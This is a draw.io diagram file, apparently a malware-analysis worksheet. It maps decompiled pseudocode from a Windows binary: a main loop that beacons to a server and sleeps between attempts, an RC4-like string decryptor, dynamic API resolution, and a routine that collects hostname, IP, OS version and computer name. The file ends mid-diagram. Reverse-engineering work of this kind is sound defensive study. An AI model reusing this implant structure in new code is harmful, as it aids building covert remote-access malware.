<mxfile host="app.diagrams.net" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0" version="24.8.2">
  <diagram name="Page-1" id="z8TMenJuWHfGxh3X5ceK">
    <mxGraphModel dx="11230" dy="4240" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="850" pageHeight="1100" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="IVjEpb5pE-T4-foRiEZy-71" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="700" y="3580" width="610" height="960" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-66" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="690" y="1620" width="770" height="1860" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-61" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-499" y="3540" width="570" height="380" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-54" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-499" y="1480" width="720" height="1960" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-50" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-110" y="1170" width="430" height="180" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-46" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-2070" y="2580" width="680" height="890" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-42" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-2140" y="1490" width="790" height="1030" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-44" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.25;exitDx=0;exitDy=0;entryX=1;entryY=0.25;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-33" target="IVjEpb5pE-T4-foRiEZy-42">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-57" value="Text" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="IVjEpb5pE-T4-foRiEZy-44">
          <mxGeometry x="-0.4828" y="-10" relative="1" as="geometry">
            <mxPoint x="3" as="offset" />
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-48" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.75;exitDx=0;exitDy=0;entryX=1;entryY=0.25;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-37" target="IVjEpb5pE-T4-foRiEZy-46">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-37" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-1190" y="1130" width="550" height="1690" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-24" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-350" y="560" width="450" height="430" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-18" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="1659" y="861" width="642" height="540" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-5" value="" style="group" vertex="1" connectable="0" parent="1">
          <mxGeometry x="940" y="500" width="649" height="1150" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-6" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="IVjEpb5pE-T4-foRiEZy-5">
          <mxGeometry width="649" height="1058.21" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-7" value="void *__thiscall sub_402510(void *this)&lt;br&gt;{&lt;br&gt;&amp;nbsp; HMODULE LibraryA; // eax&lt;br&gt;&amp;nbsp; FARPROC ProcAddress; // eax&lt;br&gt;&amp;nbsp; FARPROC v4; // eax&lt;br&gt;&amp;nbsp; FARPROC v5; // eax&lt;br&gt;&amp;nbsp; FARPROC v6; // eax&lt;br&gt;&amp;nbsp; HMODULE v8; // [esp-Ch] [ebp-10h]&lt;br&gt;&amp;nbsp; HMODULE v9; // [esp-Ch] [ebp-10h]&lt;br&gt;&amp;nbsp; HMODULE v10; // [esp-Ch] [ebp-10h]&lt;br&gt;&amp;nbsp; HMODULE v11; // [esp-Ch] [ebp-10h]&lt;br&gt;&lt;br&gt;&amp;nbsp; *(_DWORD *)this = &amp;amp;off_405728;&lt;br&gt;&amp;nbsp; sub_402800(&amp;amp;unk_4070A8, 128);&lt;br&gt;&amp;nbsp; sub_4028A0(aYf, 13);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;aRf8t69mIWm, 27);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;aPj, 16);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;aDz, 119);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;aPj_0, 35);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;aPj_1, 57);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;aRfX0wEtbUqP3, 20);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_407328, 67);&lt;br&gt;&amp;nbsp; sub_4028A0(a4zb7SNcj, 36);&lt;br&gt;&amp;nbsp; sub_4028A0(SubKey, 64);&lt;br&gt;&amp;nbsp; sub_4028A0(ValueName, 12);&lt;br&gt;&amp;nbsp; sub_4028A0(aAH, 12);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_4073E8, 31);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_407408, 30);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_407428, 32);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_407448, 39);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_4071D4, 4);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_4071D8, 5);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_4071E0, 9);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_4071EC, 15);&lt;br&gt;&amp;nbsp; sub_4028A0(&amp;amp;unk_4071FC, 4);&lt;br&gt;&amp;nbsp; sub_4028A0(LibFileName, 12);&lt;br&gt;&amp;nbsp; sub_4028A0(ProcName, 14);&lt;br&gt;&amp;nbsp; sub_4028A0(aXg, 19);&lt;br&gt;&amp;nbsp; sub_4028A0(aXg_0, 17);&lt;br&gt;&amp;nbsp; sub_4028A0(aY, 17);&lt;br&gt;&amp;nbsp; sub_4028A0(aY_0, 17);&lt;br&gt;&amp;nbsp; sub_4028A0(aXg_1, 21);&lt;br&gt;&amp;nbsp; sub_4028A0(aXg_2, 17);&lt;br&gt;&amp;nbsp; sub_4028A0(aXg_3, 20);&lt;br&gt;&amp;nbsp; LibraryA = LoadLibraryA(LibFileName);&lt;br&gt;&amp;nbsp; *((_DWORD *)this + 9) = LibraryA;&lt;br&gt;&amp;nbsp; if ( LibraryA )&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((_DWORD *)this + 1) = GetProcAddress(LibraryA, ProcName);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ProcAddress = GetProcAddress(*((HMODULE *)this + 9), aXg);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v8 = (HMODULE)*((_DWORD *)this + 9);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((_DWORD *)this + 2) = ProcAddress;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v4 = GetProcAddress(v8, aXg_0);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v9 = (HMODULE)*((_DWORD *)this + 9);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((_DWORD *)this + 3) = v4;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((_DWORD *)this + 4) = GetProcAddress(v9, aY);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v5 = GetProcAddress(*((HMODULE *)this + 9), aY_0);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v10 = (HMODULE)*((_DWORD *)this + 9);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((_DWORD *)this + 5) = v5;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v6 = GetProcAddress(v10, aXg_1);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v11 = (HMODULE)*((_DWORD *)this + 9);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((_DWORD *)this + 6) = v6;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((_DWORD *)this + 8) = GetProcAddress(v11, aXg_2);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((_DWORD *)this + 7) = GetProcAddress(*((HMODULE *)this + 9), aXg_3);&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp; return this;&lt;br&gt;}" style="text;html=1;whiteSpace=wrap;overflow=hidden;rounded=0;" vertex="1" parent="IVjEpb5pE-T4-foRiEZy-5">
          <mxGeometry x="28.86" y="53" width="500.14" height="992.55" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-16" value="&lt;h1&gt;&lt;font color=&quot;#ff8b26&quot;&gt;&lt;b&gt;(function 2, called by function 1 if v1 exists):&lt;/b&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="IVjEpb5pE-T4-foRiEZy-5">
          <mxGeometry x="12" y="20" width="606" height="30" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-17" value="&#xa;unsigned int __thiscall sub_4028A0(int this, int a2, unsigned int a3)&#xa;{&#xa;  int v3; // edx&#xa;  unsigned int result; // eax&#xa;  int v5; // ebp&#xa;  unsigned __int8 v6; // cl&#xa;  char v7[128]; // [esp+10h] [ebp-80h] BYREF&#xa;&#xa;  v3 = 0;&#xa;  result = 0;&#xa;  qmemcpy(v7, (const void *)(this + 40), sizeof(v7));&#xa;  v5 = 0;&#xa;  if ( a3 )&#xa;  {&#xa;    do&#xa;    {&#xa;      v3 = (v3 + 1) % 128;&#xa;      v6 = v7[v3];&#xa;      v5 = (v6 + v5) % 128;&#xa;      v7[v3] = v7[v5];&#xa;      v7[v5] = v6;&#xa;      *(_BYTE *)(result + a2) ^= v7[(v6 + (unsigned __int8)v7[v3]) % 128];&#xa;      ++result;&#xa;    }&#xa;    while ( result &lt; a3 );&#xa;  }&#xa;  return result;&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="1700" y="940" width="407" height="440" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-20" value="&lt;h1&gt;(function 3, called by function 2 multiple times):&lt;/h1&gt;" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="1663" y="888" width="606" height="30" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-23" value="unsigned int __stdcall sub_4027A0(int a1, char *a2)&#xa;{&#xa;  unsigned int result; // eax&#xa;&#xa;  if ( a1 == 1 )&#xa;  {&#xa;    result = 0;&#xa;    strcpy(a2, aSv);&#xa;  }&#xa;  else&#xa;  {&#xa;    result = a1 - 2;&#xa;    if ( a1 == 2 )&#xa;    {&#xa;      result = strlen(aPxE77y) + 1;&#xa;      qmemcpy(a2, aPxE77y, result);&#xa;    }&#xa;  }&#xa;  return result;&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="-310" y="660" width="312" height="310" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-31" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-13" target="IVjEpb5pE-T4-foRiEZy-6">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="1590" y="459.9999999999998" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-13" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="221" y="180" width="549" height="940" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-38" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.25;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-3" target="IVjEpb5pE-T4-foRiEZy-24">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-39" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-3" target="IVjEpb5pE-T4-foRiEZy-37">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="170" y="672" />
              <mxPoint x="170" y="1040" />
              <mxPoint x="-225" y="1040" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-52" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.25;exitY=1;exitDx=0;exitDy=0;entryX=0.25;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-3" target="IVjEpb5pE-T4-foRiEZy-51">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-60" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.25;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-3" target="IVjEpb5pE-T4-foRiEZy-56">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="441" y="1150" />
              <mxPoint x="380" y="1150" />
              <mxPoint x="380" y="1440" />
              <mxPoint x="-17" y="1440" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-64" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.75;exitY=1;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-3" target="IVjEpb5pE-T4-foRiEZy-61">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="547" y="1200" />
              <mxPoint x="430" y="1200" />
              <mxPoint x="430" y="3815" />
              <mxPoint x="71" y="3815" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-69" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=1;exitDx=0;exitDy=0;entryX=0.25;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-3" target="IVjEpb5pE-T4-foRiEZy-66">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-75" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=1;exitDx=0;exitDy=0;entryX=0;entryY=0.25;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-3" target="IVjEpb5pE-T4-foRiEZy-71">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-3" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;&lt;br&gt;&lt;/h1&gt;&lt;p&gt;void __noreturn sub_401760()&lt;br&gt;{&lt;br&gt;&amp;nbsp; unsigned int v0; // eax&lt;br&gt;&amp;nbsp; void *v1; // eax&lt;br&gt;&amp;nbsp; int v2; // eax&lt;br&gt;&amp;nbsp; unsigned int v3; // esi&lt;br&gt;&amp;nbsp; HANDLE Thread; // eax&lt;br&gt;&amp;nbsp; int v5[2]; // [esp+Ch] [ebp-15E4h] BYREF&lt;br&gt;&amp;nbsp; char Buffer[64]; // [esp+14h] [ebp-15DCh] BYREF&lt;br&gt;&amp;nbsp; struct WSAData WSAData; // [esp+54h] [ebp-159Ch] BYREF&lt;br&gt;&amp;nbsp; _BYTE v8[1024]; // [esp+1E4h] [ebp-140Ch] BYREF&lt;br&gt;&amp;nbsp; char v9[1024]; // [esp+5E4h] [ebp-100Ch] BYREF&lt;br&gt;&amp;nbsp; char v10[1024]; // [esp+9E4h] [ebp-C0Ch] BYREF&lt;br&gt;&amp;nbsp; char v11[2056]; // [esp+DE4h] [ebp-80Ch] BYREF&lt;br&gt;&amp;nbsp; int v12; // [esp+15ECh] [ebp-4h]&lt;br&gt;&lt;br&gt;&amp;nbsp; WSAStartup(0x202u, &amp;amp;WSAData);&lt;br&gt;&amp;nbsp; v0 = time(0);&lt;br&gt;&amp;nbsp; srand(v0);&lt;br&gt;&amp;nbsp; v1 = operator new(0xA8u);&lt;br&gt;&amp;nbsp; v5[1] = (int)v1;&lt;br&gt;&amp;nbsp; v12 = 0;&lt;br&gt;&amp;nbsp; if ( v1 )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v2 = &lt;font color=&quot;#ff8b26&quot;&gt;sub_402510&lt;/font&gt;(v1); //function_2&lt;br&gt;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v2 = 0;&lt;br&gt;&amp;nbsp; v12 = -1;&lt;br&gt;&amp;nbsp; dword_4075BC = v2;&lt;br&gt;&amp;nbsp; &lt;font color=&quot;#baff42&quot;&gt;sub_4027A0&lt;/font&gt;(1, &amp;amp;unk_4075C0); // function_4&lt;br&gt;&amp;nbsp; &lt;font color=&quot;#9cff63&quot;&gt;sub_4027A0&lt;/font&gt;(2, byte_4075E0);&lt;br&gt;&amp;nbsp; while ( 1 )&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; memset(v10, 0, sizeof(v10));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; memset(v8, 0, sizeof(v8));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; memset(v11, 0, 0x800u);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; memset(v9, 0, sizeof(v9));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v5[0] = 0;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; v3 = &lt;font color=&quot;#47e7ff&quot;&gt;sub_402EE0&lt;/font&gt;(v10, &amp;amp;unk_4075C0); //function 5&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;font color=&quot;#b6ff24&quot;&gt;SprintFFunction&lt;/font&gt;(Buffer);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;font color=&quot;#ff8b26&quot;&gt;ProcessDataBuffers&lt;/font&gt;(v8, v10, v3);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;font color=&quot;#ffcce6&quot;&gt;AppendToBuffer&lt;/font&gt;(v11, (int)byte_4075E0, (int)v8);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ( &lt;font color=&quot;#47e7ff&quot;&gt;sub_4034D0&lt;/font&gt;(v11, byte_4075E0, Buffer, v9, 1024, v5) &amp;amp;&amp;amp; !strcmp(v9, aStatusSuccess) ) //function_11&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Thread = CreateThread(0, 0, sub_401960, 0, 0, 0);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; WaitForSingleObject(Thread, 0xFFFFFFFF);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; SleepForX(15000);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;font color=&quot;#b6ff24&quot;&gt;sub_401C50&lt;/font&gt;(); // function12&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; SleepForX(10000);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; }&lt;br&gt;}&lt;/p&gt;" style="text;html=1;whiteSpace=wrap;overflow=hidden;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="230" y="227" width="422.88" height="890" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-25" value="&lt;h1&gt;(function_1 a.k.a main() calls everything else)&lt;br&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="230" y="200" width="550" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-30" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-6" target="IVjEpb5pE-T4-foRiEZy-18">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-33" value="&lt;h1&gt;&lt;font color=&quot;#47e7ff&quot;&gt;(function 5, called by function 1 within while loop, something to do with network):&lt;/font&gt;&lt;br&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-1180" y="1140" width="510" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-36" value="char *__thiscall sub_402EE0(void *this, int a2, const char *a3)&#xa;{&#xa;  unsigned int v4; // esi&#xa;  struct hostent *v5; // eax&#xa;  char *v6; // eax&#xa;  int v7; // ecx&#xa;  unsigned int v8; // kr04_4&#xa;  unsigned int v9; // ecx&#xa;  char *v10; // ebp&#xa;  unsigned int v11; // kr08_4&#xa;  unsigned int v12; // kr0C_4&#xa;  char *v13; // edi&#xa;  unsigned int v14; // ecx&#xa;  char *v15; // ebp&#xa;  unsigned int v16; // kr10_4&#xa;  unsigned int v17; // ecx&#xa;  char *v18; // ebp&#xa;  unsigned int v19; // kr14_4&#xa;  DWORD nSize; // [esp+10h] [ebp-324h] BYREF&#xa;  CHAR Buffer[61]; // [esp+14h] [ebp-320h] BYREF&#xa;  __int16 v23; // [esp+51h] [ebp-2E3h]&#xa;  char v24; // [esp+53h] [ebp-2E1h]&#xa;  char v25[61]; // [esp+54h] [ebp-2E0h] BYREF&#xa;  __int16 v26; // [esp+91h] [ebp-2A3h]&#xa;  char v27; // [esp+93h] [ebp-2A1h]&#xa;  char v28[61]; // [esp+94h] [ebp-2A0h] BYREF&#xa;  __int16 v29; // [esp+D1h] [ebp-263h]&#xa;  char v30; // [esp+D3h] [ebp-261h]&#xa;  char Destination[61]; // [esp+D4h] [ebp-260h] BYREF&#xa;  __int16 v32; // [esp+111h] [ebp-223h]&#xa;  char v33; // [esp+113h] [ebp-221h]&#xa;  _BYTE VersionInformation[284]; // [esp+114h] [ebp-220h] BYREF&#xa;  char name[257]; // [esp+230h] [ebp-104h] BYREF&#xa;  __int16 v36; // [esp+331h] [ebp-3h]&#xa;  char v37; // [esp+333h] [ebp-1h]&#xa;&#xa;  memset(name, 0, sizeof(name));&#xa;  v36 = 0;&#xa;  v37 = 0;&#xa;  *(_BYTE *)a2 = 1;&#xa;  v4 = 0;&#xa;  if ( !gethostname(name, 255) )&#xa;  {&#xa;    v5 = gethostbyname(name);&#xa;    if ( v5 )&#xa;    {&#xa;      v6 = inet_ntoa(**(struct in_addr **)v5-&gt;h_addr_list);&#xa;      v4 = inet_addr(v6);&#xa;      dword_407624 = v4;&#xa;    }&#xa;  }&#xa;  *(_DWORD *)(a2 + 1) = v4;&#xa;  *(_DWORD *)(a2 + 5) = GetOEMCP();&#xa;  *(_DWORD *)(a2 + 9) = GetTickCount();&#xa;  *(_DWORD *)(a2 + 13) = sub_4031F0(this) == 0;&#xa;  memset(VersionInformation, 0, sizeof(VersionInformation));&#xa;  *(_DWORD *)VersionInformation = 284;&#xa;  GetVersionExW((LPOSVERSIONINFOW)VersionInformation);&#xa;  v7 = *(_DWORD *)&amp;VersionInformation[8];&#xa;  *(_DWORD *)(a2 + 17) = *(_DWORD *)&amp;VersionInformation[4];&#xa;  *(_DWORD *)(a2 + 21) = v7;&#xa;  memset(Destination, 0, sizeof(Destination));&#xa;  memset(v28, 0, sizeof(v28));&#xa;  v32 = 0;&#xa;  v33 = 0;&#xa;  v29 = 0;&#xa;  v30 = 0;&#xa;  *(_BYTE *)(a2 + 25) = VersionInformation[282];&#xa;  sub_403220(Destination, v28);&#xa;  v8 = strlen(Destination) + 1;&#xa;  *(_WORD *)(a2 + 26) = v8 - 1;&#xa;  v9 = (unsigned __int16)(v8 - 1);&#xa;  qmemcpy((void *)(a2 + 28), Destination, v9);&#xa;  v10 = (char *)(v9 + a2 + 28 + 2);&#xa;  v11 = strlen(v28) + 1;&#xa;  *((_WORD *)v10 - 1) = v11 - 1;&#xa;  qmemcpy(v10, v28, (unsigned __int16)(v11 - 1));&#xa;  memset(Buffer, 0, sizeof(Buffer));&#xa;  v23 = 0;&#xa;  v24 = 0;&#xa;  nSize = 64;&#xa;  GetComputerNameA(Buffer, &amp;nSize);&#xa;  v12 = strlen(Buffer) + 1;&#xa;  v13 = &amp;v10[(unsigned __int16)(v11 - 1) + 2];&#xa;  *((_WORD *)v13 - 1) = v12 - 1;&#xa;  v14 = (unsigned __int16)(v12 - 1);&#xa;  v15 = &amp;v13[v14];&#xa;  qmemcpy(v13, Buffer, v14);&#xa;  memset(v25, 0, sizeof(v25));&#xa;  v26 = 0;&#xa;  v27 = 0;&#xa;  sub_403360(v25);&#xa;  v15 += 2;&#xa;  v16 = strlen(v25) + 1;&#xa;  *((_WORD *)v15 - 1) = v16 - 1;&#xa;  v17 = (unsigned __int16)(v16 - 1);&#xa;  qmemcpy(v15, v25, v17);&#xa;  v18 = &amp;v15[v17 + 2];&#xa;  v19 = strlen(a3) + 1;&#xa;  *((_WORD *)v18 - 1) = v19 - 1;&#xa;  qmemcpy(v18, a3, (unsigned __int16)(v19 - 1));&#xa;  return &amp;v18[(unsigned __int16)(v19 - 1) - a2];&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="-1140" y="1240" width="390" height="1510" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-40" value="&lt;h1&gt;&lt;font color=&quot;#baff42&quot;&gt;(function 4, called by function 1 before going into while loop)&lt;/font&gt;&lt;br&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-300" y="555" width="430" height="70" as="geometry" />
        </mxCell>
